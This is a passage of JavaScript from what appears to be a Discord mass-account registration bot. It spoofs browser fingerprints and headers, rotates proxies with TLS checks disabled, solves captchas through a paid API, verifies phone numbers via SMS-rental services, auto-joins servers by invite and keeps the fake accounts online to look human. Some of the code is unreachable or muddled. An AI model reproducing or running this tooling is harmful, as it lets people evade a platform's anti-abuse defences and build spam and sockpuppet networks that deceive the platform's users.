        `accept-language: ${country};q=0.9,en-US;q=0.8,en;q=0.7`,
        'dnt: 1',
        `cookie: ${cookie}`,
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'referer: https://discord.com/login',
        `user-agent: ${user_agent.user_agent}`,
        `x-context-properties: eyJsb2NhdGlvbiI6IlJlZ2lzdGVyIn0=`,
        `x-fingerprint: ${fingerprint}`,
        `x-super-properties: ${user_agent.base64}`
      ];
      var data = await curlReq('https://discord.com/api/v8/experiments', 'GET', false, h, proxy);
      if (!data.type) return fin({ type: false, err: data.err });
      if (data.statusCode != 200) return fin({ type: false, err: '235_2_' + data.statusCode });
      //return fin({type: true, fingerprint, cookie})
      var h = [
        `accept-language: ${country};q=0.9,en-US;q=0.8,en;q=0.7`,
        'dnt: 1',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'referer: https://discord.com/login',
        `user-agent: ${user_agent.user_agent}`,
        //`x-context-properties: eyJsb2NhdGlvbiI6IkxvZ2luIn0=`,
        `x-fingerprint: ${fingerprint}`,
      ];
      setTimeout(() => {
        curlReq('https://discord.com/api/v8/auth/consent-required', 'GET', false, h, proxy);
      }, 2000);
      return fin({type: true, fingerprint})
        var s = function (e) {
            return fin({ type: false, err: e });
        }
        var Curl = require('node-libcurl').Curl;
        var curl = new Curl();
        //curl.setOpt(52, true);
        if (proxy) {
            if (tmp_data['proxy_type'] == 'socks') {
                curl.setOpt(Curl.option.PROXYTYPE, Curl.proxy.SOCKS5);
                curl.setOpt(Curl.option.PROXY, proxy);
            } else {
                curl.setOpt(Curl.option.PROXY, `http://${proxy}`);
            }
        }
        curl.setOpt(Curl.option.SSL_VERIFYPEER, false);
        //curl.setOpt(41, true);
        curl.setOpt(43, false);
        curl.setOpt(10102, '');
        curl.setOpt(10036, 'GET');
        curl.setOpt(10002, 'https://discord.com/api/v8/experiments');
        //curl.setOpt(155, 0);
        curl.setOpt(10031, '');
        curl.setOpt(10135, '');

        curl.setOpt(10023, h);

        curl.on('end', function (statusCode, body, headers) {
            this.close();
            if (statusCode != 200) return fin({ type: false, err: '235_' + statusCode });
            body = JSON.parse(body);
            if (!body.fingerprint) return fin({ type: false, err: '235_2' });
            var fingerprint = body.fingerprint;
            return fin({ type: true, fingerprint });
            var h = [
                `authorization: undefined`,
                `accept-language: ru`,
                'dnt: 1',
                'referer: https://discord.com',
                'sec-fetch-mode: cors',
                `user-agent: ${user_agent.user_agent}`,
                'x-context-properties: eyJsb2NhdGlvbiI6IkxvZ2luIn0=',
                `x-fingerprint: ${fingerprint}`,
                `x-super-properties: eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc5LjAuMzk0NS44OCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiNzkuMC4zOTQ1Ljg4Iiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjUxODYzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==`
            ];
            var s = function (e) {
                return fin({ type: false, err: e });
            }
            var Curl = require('node-libcurl').Curl;
            var curl = new Curl();
            //curl.setOpt(52, true);
            if (proxy) {
                if (tmp_data['proxy_type'] == 'socks') {
                    curl.setOpt(Curl.option.PROXYTYPE, Curl.proxy.SOCKS5);
                    curl.setOpt(Curl.option.PROXY, proxy);
                } else {
                    curl.setOpt(Curl.option.PROXY, `http://${proxy}`);
                }
            }
            curl.setOpt(Curl.option.SSL_VERIFYPEER, false);
            //curl.setOpt(41, true);
            curl.setOpt(43, false);
            curl.setOpt(10102, '');
            curl.setOpt(10036, 'GET');
            curl.setOpt(10002, 'https://discord.com/api/v8/experiments');
            //curl.setOpt(155, 0);
            curl.setOpt(10031, '');
            curl.setOpt(10135, '');

            curl.setOpt(10023, h);

            curl.on('end', function (statusCode, body, headers) {
                this.close();
                //alert(body.fingerprint);
                return fin({ type: true, fingerprint });
                //console.info(body);
            });

            curl.on('error', s);
            curl.perform();
            //alert(body.fingerprint);
            //console.info(body);
        });

        curl.on('error', s);
        curl.perform();
        // var params = {
        //   url: 'https://discord.com/api/v8/experiments',
        //   method: 'GET',
        //   headers: {
        //     'dnt': '1',
        //     'content-type': 'application/json',
        //   }
        // };
        // if (user_agent) {
        //   params.headers['user-agent'] = user_agent.user_agent;
        //   params.headers['x-track'] = user_agent.user_agent;
        // } else {
        //   params.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36';
        //   params.headers['x-track'] = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc1LjAuMzc3MC4xNDIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6Ijc1LjAuMzc3MC4xNDIiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTk5OSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=';
        // }
        // if (proxy) params.proxy = 'http://'+proxy;params.timeout = 15000;
        // req(params, (err, response, body) => {
        //   if (err || !response || !response.statusCode) return fin({type: false, err: 1});
        //   body = JSON.parse(body);
        //   if (response.statusCode != 200) return fin({type: false, err: 2});
        //   if (!body.fingerprint) return fin({type: false, err: 3});
        //   return fin({type: true, fingerprint: body.fingerprint});
        // })
    });
}

function get_avatar() {
  return avatars[Math.floor(Math.random()*avatars.length)];
}

function get_username_user(token, proxy = false, user_agent = false) {
  return new Promise(fin => {
    var params = {
      url: 'https://discord.com/api/v8/users/@me',
      method: 'GET',
      headers: {
        'authorization': token,
        'content-type': 'application/json',
        'dnt': '1',
        'referer': 'https://discord.com/channels/@me',
        'accept-language': country,
        'origin': 'https://discord.com',
        'accept': '*/*'
      }
    }
    if (user_agent) {
      params.headers['user-agent'] = user_agent.user_agent;
      params.headers['x-super-properties'] = user_agent.base64;
    } else {
      params.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36';
      params.headers['x-super-properties'] = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc1LjAuMzc3MC4xNDIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6Ijc1LjAuMzc3MC4xNDIiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTk5OSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=';
    }
    if (proxy) {
      var proxy_type = tmp_data['proxy_type'];
      if (proxy_type == 'socks') {
        var agent = require('socks-proxy-agent');
      } else {
        var agent = require('https-proxy-agent')
      }
      params.agent = new agent(`${proxy_type}://${proxy}`);
    }
    params.timeout = 15000;
    req(params, (err, response, body) => {
      if (err || !response || !body) return fin({type: false});
      body = JSON.parse(body);
      var username = `${body.username}#${body.discriminator}`;
      return fin({type: true, username: username});
    })
  });
}

$('body').on('change', '#select-proxy-type', function () {
  update_tmp('proxy_type', $(this).val());
});

function get_invite_code(url) {
  return url.split('/')[url.split('/').length - 1]
}

$('body').on('change', '#invite_accs_enabler', function () {
  update_tmp('invite_accs_enabler', $(this).prop('checked'));
  if ($(this).prop('checked')) {
    $('#invite_for_accs').addClass('active');
  } else {
    $('#invite_for_accs').removeClass('active');
  }
})

function opacityText(block, text) {
  return new Promise(async fin => {
    block.css('opacity', 0);
    await delay(150);
    block.text(text);
    await delay(10);
    block.css('opacity', '');
    await delay(100);
    fin()
  })
}

function deleteEmailFromList(email, password = false) {
  if (!$('#verify_email_imap_enabler').prop('checked') && $('#random_emails_enabler').prop('checked')) return;
  var list = store.get('last_emails')
  if (!list) return;
  var newer = [];
  if (password) email = `${email}:${password}`;
  list.forEach(e => {
    if (e.toLowerCase() != email.toLowerCase()) newer.push(e)
  });
  store.set('last_emails', newer);
  var count = newer.length + NumberEnd(newer.length, [' email', ' emails', ' emails']);
  opacityText($('#count-of-email-regs'), count);
}

function deleteUsernameFromList(username) {
  if ($('#random_usernames_enabler').prop('checked') || !$('#delete_used_usernames').prop('checked')) return;
  var list = store.get('last_usernames')
  if (!list) return;
  var newer = [];
  list.forEach(e => {
    if (e.toLowerCase() != username.toLowerCase()) newer.push(e)
  });
  store.set('last_usernames', newer);
  var count = newer.length + NumberEnd(newer.length, translater(translate[85]));
  opacityText($('#count-of-usernames-regs'), count);
}

function activateAccount(token, user_agent, proxy, cookie, stayOnline = false) {
  return new Promise(async fin => {
    try {
      var defaultHeaders = [
        'accept: */*',
        `accept-language: ru`,
        `authorization: ${token}`,
        `cookie: ${cookie}`,
        'dnt: 1',
        'referer: https://discord.com/channels/@me',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        `user-agent: ${user_agent.user_agent}`
      ];
      var webSocketHeaders = {
        //'Sec-WebSocket-Accept'
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': `${country};q=0.8,en;q=0.7`,
        'Cache-Control': 'no-cache',
        'Connection': 'Upgrade',
        'Host': 'gateway.discord.gg',
        'Origin': 'https://discord.com',
        'Pragma': 'no-cache',
        'Sec-WebSocket-Extensions': 'permessage-deflate; client_max_window_bits',
        //'Sec-WebSocket-Key': Buffer(crypto.randomBytes(16)).toString('base64'),
        'Sec-WebSocket-Version': 13,
        'Upgrade': 'websocket',
        'User-Agent': user_agent.user_agent
      }
      function webSocketActivate(url) {
        return new Promise(async fin => {
          try {
            var WebSocket = require('ws');
            if (proxy) {
              var proxy_type = tmp_data['proxy_type'];
              if (proxy_type == 'socks') {
                var agent = require('socks-proxy-agent');
              } else {
                var agent = require('https-proxy-agent')
              }
              agent = new agent(`${proxy_type}://${proxy}`);
            }
            url = `${url}/?encoding=json&v=6&compress=zlib-stream` 
            var ws = new WebSocket(url, {
              headers: webSocketHeaders,
              agent
            });
            ws.binaryType = 'arraybuffer'
            if (!stayOnline) {
              setTimeout(() => {
                ws.close();
              }, rand(180, 200) * 1000);
            }            
            var zlib = require('pako');
            var inflate = zlib.Inflate({
              chunkSize: 65535,
              flush: zlib.Z_SYNC_FLUSH,
              to: 'json'
            });
            var onMessage = async data => {
              try {
                data = data.data;
                if (data instanceof ArrayBuffer) data = new Uint8Array(data);
                var packet = false;
                const l = data.length;
                const flush = l >= 4 &&
                  data[l - 4] === 0x00 &&
                  data[l - 3] === 0x00 &&
                  data[l - 2] === 0xFF &&
                  data[l - 1] === 0xFF;
                inflate.push(data, flush && zlib.Z_SYNC_FLUSH);
                if (!flush) return;
                packet = Buffer(inflate.result).toString();
                data = JSON.parse(packet);
                if (data.t == 'READY') {
                  await delay(3000);
                  var params = JSON.stringify({
                    op: 4,
                    d: {
                      guild_id: null,
                      channel_id: null,
                      self_mute: true,
                      self_deaf: false,
                      self_video: false
                    }
                  });
                  ws.send(params)
                  if (stayOnline) {
                    var senderStatus = () => {
                      var status = stayOnline;
                      if (status == 'random') {
                        status = ['online', 'dnd', 'idle', 'invisible'];
                        status = status[Math.floor(Math.random() * status.length)];
                      }
                      var params = {
                        op: 3,
                        d: {
                          status,
                          since: 0,
                          activities: [],
                          afk: false
                        }
                      }
                      ws.send(JSON.stringify(params))
                      setTimeout(senderStatus, rand(270, 305) * 1000);
                    }
                    senderStatus();
                  }
                  var onedash = [];
                  for (var i = 0; i < rand(1, 5); i++) onedash.push(null);
                  var doneCount = 0;
                  await delay(40000);
                  onedash.forEach(async (e, ind) => {
                    await delay(rand(38, 45) * 1000 * ind);
                    var params = JSON.stringify({
                      op: 1,
                      d: 2
                    });
                    ws.send(params)
                    if (++doneCount >= onedash.length && !stayOnline) return ws.close();
                  })
                }
              } catch (err) {
                meAtztGn1pdERnu(err);
              }
            }
            var onOpen = async data => {
              var properties = JSON.parse(Buffer.from(user_agent.base64, 'base64'));
              var params = {
                op: 2,
                d: {
                  token,
                  capabilities: 13,
                  client_state: {
                    guild_hashes: {},
                    highest_last_message_id: '0',
                    read_state_version: 0,
                    user_guild_settings_version: -1
                  },
                  properties,
                  presense: {
                    status: 'online',
                    since: 0,
                    activities: [],
                    afk: false,
                  },
                  compress: false
                }                
              }
              params = JSON.stringify(params);
              ws.send(params);
            }
            ws.onmessage = onMessage
            ws.onopen = onOpen
          } catch (err) {
            meAtztGn1pdERnu(err)
            return fin({type: false, err});
          }
        })
      }
      curlReq('https://discord.com/api/v8/gateway', 'GET', false, defaultHeaders, proxy).then(async data => {
        try {
          if (!data.type) return;
          var body = data.body;
          var statusCode = data.statusCode;
          if (statusCode != 200) return;
          if (typeof body == 'string') return;
          var url = body.url;
          if (!url) return;
          var check = await webSocketActivate(url);
        } catch (err) {
          meAtztGn1pdERnu(err)         
        }
      })
      curlReq('https://discord.com/api/v8/users/@me/affinities/users', 'GET', false, defaultHeaders, proxy)
      curlReq('https://best.discord.media/region', 'GET', false, [
        'accept: */*',
        `accept-language: ru`,
        'dnt: 1',
        'origin: https://discord.com',
        'referer: https://discord.com/channels/@me',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        `user-agent: ${user_agent.user_agent}`
      ], proxy);
      curlReq('https://discord.com/api/v8/users/@me/affinities/guilds', 'GET', false, defaultHeaders, proxy);
      curlReq('https://status.discord.com/api/v2/scheduled-maintenances/upcoming.json', 'GET', false, [
        'accept: */*',
        `accept-language: ru`,
        'dnt: 1',
        'origin: https://discord.com',
        'referer: https://discord.com/channels/@me',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        `user-agent: ${user_agent.user_agent}`
      ], proxy);
      curlReq('https://discord.com/api/v8/users/@me/library', 'GET', false, defaultHeaders, proxy);
      curlReq('https://discord.com/api/v8/applications/detectable', 'GET', false, defaultHeaders, proxy);
      var h = [
        'accept: */*',
        `accept-language: ru`,
        `authorization: ${token}`,
        `cookie: ${cookie}`,
        'dnt: 1',
        'referer: https://discord.com/channels/@me',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        `user-agent: ${user_agent.user_agent}`,
        `x-super-properties: ${user_agent.base64}`
      ];
      var data = await curlReq('https://discord.com/api/v8/users/@me/settings', 'PATCH', {
        timezone_offset: -180
      }, h, proxy);
    } catch (err) {
      meAtztGn1pdERnu(err)
      return fin({ type: false, err });
    }
  })
}

function addInvalidEmailAccount(email) {
  var html = `Не удалось подключиться к ${email}`;
  if (app_lang == 'en') var html = `Failed connect to ${email}`;
  add_log(html, 1);
}

function addCheckEmailAccount(email) {
  var html = `Проверяем аккаунт ${email}...`;
  if (app_lang == 'en') var html = `Check account ${email}...`;
  add_log(html, 1);
}

var checkGetEmail = {};

function register_acc_api(n = 1, verfy_mails = false, stayOnline = false) {
  return new Promise(async fin => {
    //var domain = domains[Math.floor(Math.random()*domains.length)];
    var email = get_email(verfy_mails);    
    var emailPassword = false;
    if (!email.type) return fin({type: false, err: 'emailer_'+email.type});
    email = email.email;
    if (email.indexOf(':') >= 0) {
        email = email.split(':');
        if (email.length < 2) return fin({type: false, err: 'emailer_password_not_found'});
        emailPassword = email[1];
        email = email[0];
        var check = await checkImapConnectiopn(email, emailPassword);
        if (!check.type) {
          addInvalidEmailAccount(email);
          return fin({type: false, err: 'email_account_not_valid'});
        }
    }
    //console.log(email)
    var username = get_username();
    if (!username.type) return fin({type: false, err: 'username_'+username.type});
    username = username.username;
    var pass = generatePassowrd(10 + Math.floor(Math.random() * (16 + 1 - 10)));
    log('EMAIL: '+email+' PASS: '+pass);
    var proxy = false;
    if ($('#proxy_enabler').prop('checked')) {
      proxy = get_proxy();
      if (!proxy.type) return fin({type: false, err: 'proxy_'+username.type});
      proxy = proxy.proxy;
    }
    var potok_number = n;
    add_log_reger(email, pass, proxy, potok_number);
    var user_agent = get_user_agent();
    var accer = {
      email: email,
      pass: pass,
      proxy: proxy,
      user_agent: user_agent
    };
    var data_key = '6Lef5iQTAAAAAKeIvIY-DeexoO3gj7ryl9rLMEnn';
    get_fingerprint_api(proxy, user_agent).then(async f => {
      if (!f.type) return fin({type: false, err: '235_'+f.err});
      var fingerprint = f.fingerprint;
      var cookie = f.cookie;
      var Curl = require('node-libcurl').Curl;
      var json = {
        "fingerprint": fingerprint,
        "email": email,
        "username": username,
        "password": pass,
        "invite": null,
        "consent": true,
        "date_of_birth": `19${rand(80, 97)}-${rand(10, 12)}-${rand(10, 30)}`,
        "gift_code_sku_id": null,
        "captcha_key": null
      };        
      var h = [
        `authorization: undefined`,
        `accept-language: ru`,
        'dnt: 1',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'origin: https://discord.com',
        'referer: https://discord.com/register',
        `user-agent: ${user_agent.user_agent}`,
        `cookie: ${cookie}`,
        //`x-context-properties: eyJsb2NhdGlvbiI6IkxvZ2luIn0=`,
        `x-fingerprint: ${fingerprint}`,
        `x-super-properties: ${user_agent.base64}`
      ];
      h.push(`content-length: ${JSON.stringify(json).length}`);
      //console.log('json', json)
      var data = await curlReq('https://discord.com/api/v8/auth/register', 'POST', json, h, proxy);
      if (!data.type || !data.statusCode || !data.body) {
        checkGetEmail[email] = false;
        return fin({type: false, err: `874_${data.err}`});
      }
      if (data.statusCode == 201) {
        var body = JSON.stringify(data.body);          
        if (body.indexOf('cloudflare') >= 0) return fin({type: false, err: '2720_proxy'});
        body = JSON.parse(body);
        meAtztGn1pdERnu(body);            
        if (body.email) {
          deleteEmailFromList(email, emailPassword);
          return fin({type: false, err: 'wrong_email'});
        }
        if (JSON.stringify(body).indexOf('limit') >= 0) {
          add_log_limited(n);
          if (!body.token) return fin({type: false, err: 'limit'});
        }
        if (!body.token) return fin({type: false, err: 'not_token: '+Object.keys(body)[0]});
        deleteEmailFromList(email, emailPassword);
        var token = body.token;
      } else {
        var check = await res_cap(data_key, c.register, 1, $('#apikey_captcha').val(), proxy)
        if (!check.type) return fin({type: false, err: 'check_cap'});
        var captcha_key = check.token;
        var Curl = require('node-libcurl').Curl;
        var json = {
          "fingerprint": fingerprint,
          "email": email,
          "username": username,
          "password": pass,
          "invite": null,
          "consent": true,
          "date_of_birth": `19${rand(80, 97)}-${rand(10, 12)}-${rand(10, 30)}`,
          "gift_code_sku_id": null,
          "captcha_key": captcha_key
        };        
        var h = [
          `authorization: undefined`,
          `accept-language: ru`,
          'dnt: 1',
          'sec-fetch-dest: empty',
          'sec-fetch-mode: cors',
          'sec-fetch-site: same-origin',
          'origin: https://discord.com',
          'referer: https://discord.com/register',
          `user-agent: ${user_agent.user_agent}`,
          //`cookie: ${cookie}`,
          //`x-context-properties: eyJsb2NhdGlvbiI6IkxvZ2luIn0=`,
          `x-fingerprint: ${fingerprint}`,
          `x-super-properties: ${user_agent.base64}`
        ];
        h.push(`content-length: ${JSON.stringify(json).length}`);
        //console.log('json', json)
        var data = await curlReq('https://discord.com/api/v8/auth/register', 'POST', json, h, proxy);          
        if (!data.type) {
          checkGetEmail[email] = false;
          return fin({type: false, err: `874_${data.err}`});
        }
        if (data.statusCode != 201) {
          var err = data.body;
          if (typeof data.body == 'object') {
            if ('message' in data.body) {
              err = data.body.message;
            } else {                
              err = JSON.stringify(data.body);
            }
          } else if (typeof data.body == 'string') {
            var err = data.body;
          }
          return fin({type: false, err: `498: ${err}`});
        }
        if (!data.statusCode || !data.body) return fin({type: false, err: '1_proxy'});
        var body = JSON.stringify(data.body);          
        if (body.indexOf('cloudflare') >= 0) return fin({type: false, err: '2720_proxy'});
        body = JSON.parse(body);
        meAtztGn1pdERnu(body);            
        if (body.email) {
          deleteEmailFromList(email, emailPassword);
          return fin({type: false, err: 'wrong_email'});
        }
        if (JSON.stringify(body).indexOf('limit') >= 0) {
          add_log_limited(n);
          if (!body.token) return fin({type: false, err: 'limit'});
        }
        if (!body.token) return fin({type: false, err: 'not_token: '+Object.keys(body)[0]});
        deleteEmailFromList(email, emailPassword);
        var token = body.token;
      }
      activateAccount(token, user_agent, proxy, cookie, stayOnline);
      meAtztGn1pdERnu('TOKEN: ' + token);
      accer.token = token;
      var verify = verify_phone_check;
      var inviting = $('#invite_accs_enabler').prop('checked');
      var need_verfy = false;
      if (inviting) {
        inviting = get_invite_code($('#invite_for_accs').val());
        var invitingp = await invite_acc(accer.token, inviting, accer.email, accer.proxy, user_agent);
        if (!invitingp.type) {
          if (invitingp.err == 45) {
            need_verfy = true;
          } else {
            return fin({ type: false, err: 9382 });
          }
        }
      }
      if (verfy_mails) {
        var vermail = await verify_email(accer.token, accer.email, accer.proxy, user_agent, cookie, emailPassword);
        if (!vermail.type) return fin({ type: false, err: `7834: ${vermail.err}` });
      }
      if (verify) {
        var e = await verify_phone_api(token, proxy, n, user_agent, cookie);
        meAtztGn1pdERnu('e: ' + JSON.stringify(e));
        if (!e.type) return fin({ type: false, err: e.err });
        if (inviting) {
          if (need_verfy) invitingp = await invite_acc(accer.token, inviting, accer.email, accer.proxy, user_agent);
          if (!invitingp.type) return fin({ type: false, err: 9382 });
        }
      }
      if (avatar_load) {
        var avatar = get_avatar();
        var check = await change_avatar_api(accer.token, accer.email, accer.pass, username, avatar, accer.proxy, potok_number, user_agent, cookie);
        if (!check.type) return fin({ type: false, err: 924 });
      }
      deleteUsernameFromList(username);
      return fin({ type: true, acc: accer });
      }).catch(r => {alert(r)});
  });
}

function get_proxy_onedash(type = 'http') {
  return new Promise(fin => {
    var params = {
      url: `https://google.it`,
      method: 'GET',
      headers: {
        token: user_token
      }
    }
    req(params, (err, response, body) => {
      if (err || !response || response.statusCode != 200 || !body) return fin({type: false, err: 1, statusCode: response.statusCode});
      body = JSON.parse(body);
      if (!body.type || !body.data) return fin({type: false, err: 2});
      return fin({type: true, data: body.data});
    });
  });
}

function verify_phone_api(token, proxy = false, n = 1, user_agent = false, cookie = '') {
  return new Promise(async fin => {
    meAtztGn1pdERnu(user_agent);
    add_log_verfy_phone(n);
    var last_number;
    var potok_number = 1;
    if (type_verify == 2) {
      get_phone_smsreg(potok_number).then(async (phone) => {
        meAtztGn1pdERnu('phone: '+JSON.stringify(phone));
        if (!phone.type) return fin({type: false});
        last_number = {
          phone: phone.number,
          id: phone.id
        };
        meAtztGn1pdERnu('last_number: '+last_number);
        var h = [
          `authorization: ${token}`,
          'content-type: application/json',
          'dnt: 1',
          'sec-fetch-dest: empty',
          'sec-fetch-mode: cors',
          'sec-fetch-site: same-origin',
          `referer: ${url}`,
          `accept-language: ru`,
          `cookie: ${cookie}`,
          'origin: https://discord.com',
          'accept: */*',
          `user-agent: ${user_agent.user_agent}`,
          `x-super-properties: ${user_agent.base64}`
        ];
        var params = {
          phone
        };
        var data = await curlReq('https://discord.com/api/v8/users/@me/phone', 'POST', params, h, proxy);
        if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
        if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
        meAtztGn1pdERnu(proxy);
        get_code_from_phone_sms_reg(last_number.id).then(async (code) => {
          if (!code.type) return fin({ type: false });
          var code = code.code
          code = code.replace(/ /g, '')
          var h = [
            `authorization: ${token}`,
            'content-type: application/json',
            'dnt: 1',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            `referer: https://discord.com/channels/@me`,
            `accept-language: ru`,
            `cookie: ${cookie}`,
            'origin: https://discord.com',
            'accept: */*',
            `user-agent: ${user_agent.user_agent}`,
            `x-super-properties: ${user_agent.base64}`
          ];
          var params = {
            code
          };
          var data = await curlReq('https://discord.com/api/v8/users/@me/phone/verify', 'POST', params, h, proxy);
          meAtztGn1pdERnu(data.body);
          if (!data.type) return fin({type: false, err: 'dont_body'});
          if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
          return fin({ type: true });
        });
      }, () => {
        return fin({type: false});
      })
    } else if (type_verify == 3) {
      get_phone_sms_activate(potok_number).then((phone) => {
        if (!phone.type) return fin({type: false, err: 5669});
        var data_id = phone.id;
        var phone = phone.number;
        if (phone.indexOf('+') < 0) phone = `+${phone}`
        set_ready_number_sms_activate(data_id).then(async (check) => {
          if (!check.type) return fin({type: false, err: 187});
          var h = [
            `authorization: ${token}`,
            'content-type: application/json',
            'dnt: 1',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            `referer: https://discord.com/channels/@me`,
            `accept-language: ru`,
            `cookie: ${cookie}`,
            'origin: https://discord.com',
            'accept: */*',
            `user-agent: ${user_agent.user_agent}`,
            `x-super-properties: ${user_agent.base64}`
          ];
          var params = {
            phone
          };
          var data = await curlReq('https://discord.com/api/v8/users/@me/phone', 'POST', params, h, proxy);
          if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
          if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
          meAtztGn1pdERnu('SSS');
          get_code_from_phone_sms_activate(data_id).then(async (code) => {
            meAtztGn1pdERnu('code: ' + code);
            if (!code.type) return fin({ type: false, err: code.err });
            var code = code.code
            code = code.replace(/ /g, '')
            var h = [
              `authorization: ${token}`,
              'content-type: application/json',
              'dnt: 1',
              'sec-fetch-dest: empty',
              'sec-fetch-mode: cors',
              'sec-fetch-site: same-origin',
              `referer: https://discord.com/channels/@me`,
              `accept-language: ru`,
              `cookie: ${cookie}`,
              'origin: https://discord.com',
              'accept: */*',
              `user-agent: ${user_agent.user_agent}`,
              `x-super-properties: ${user_agent.base64}`
            ];
            var params = {
              code
            };
            var data = await curlReq('https://discord.com/api/v8/users/@me/phone/verify', 'POST', params, h, proxy);
            meAtztGn1pdERnu(data.body);
            if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
            if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
            return fin({ type: true });
          });
        });
      })
    }  else if (type_verify == 13) {
      get_phone_sms_hub(potok_number).then((phone) => {
        if (!phone.type) return fin({type: false, err: 5669});
        var data_id = phone.id;
        var phone = phone.number;
        if (phone.indexOf('+') < 0) phone = `+${phone}`
        set_ready_number_sms_hub(data_id).then(async (check) => {
          if (!check.type) return fin({type: false, err: 187});
          var h = [
            `authorization: ${token}`,
            'content-type: application/json',
            'dnt: 1',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            `referer: https://discord.com/channels/@me`,
            `accept-language: ru`,
            `cookie: ${cookie}`,
            'origin: https://discord.com',
            'accept: */*',
            `user-agent: ${user_agent.user_agent}`,
            `x-super-properties: ${user_agent.base64}`
          ];
          var params = {
            phone
          };
          var data = await curlReq('https://discord.com/api/v8/users/@me/phone', 'POST', params, h, proxy);
          if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
          if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
          meAtztGn1pdERnu('SSS');
          get_code_from_phone_sms_hub(data_id).then(async (code) => {
            meAtztGn1pdERnu('code: ' + code);
            if (!code.type) return fin({ type: false, err: code.err });
            var code = code.code
            code = code.replace(/ /g, '')
            var h = [
              `authorization: ${token}`,
              'content-type: application/json',
              'dnt: 1',
              'sec-fetch-dest: empty',
              'sec-fetch-mode: cors',
              'sec-fetch-site: same-origin',
              `referer: https://discord.com/channels/@me`,
              `accept-language: ru`,
              `cookie: ${cookie}`,
              'origin: https://discord.com',
              'accept: */*',
              `user-agent: ${user_agent.user_agent}`,
              `x-super-properties: ${user_agent.base64}`
            ];
            var params = {
              code
            };
            var data = await curlReq('https://discord.com/api/v8/users/@me/phone/verify', 'POST', params, h, proxy);
            meAtztGn1pdERnu(data.body);
            if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
            if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
            return fin({ type: true });
          });
        });
      })
    } else if (type_verify == 5) {
